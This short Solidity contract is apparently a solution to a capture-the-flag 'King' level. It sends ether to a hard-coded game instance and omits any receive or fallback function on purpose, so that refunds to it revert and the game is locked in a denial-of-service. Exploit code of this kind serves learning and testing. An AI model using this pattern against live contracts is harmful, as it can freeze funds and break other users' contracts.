// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract King {
    address private constant KING_GAME_INSTANCE_ADDRESS = 0x1cC8Ca4E9FD18eC57e7E49237e8AE1F3b09104CF;
    function getKingShip() external payable {
        payable(KING_GAME_INSTANCE_ADDRESS).call{value : msg.value}("");
    }

    // no receive and fallback function , so that call `transfer`/`send` to this contract will revert
}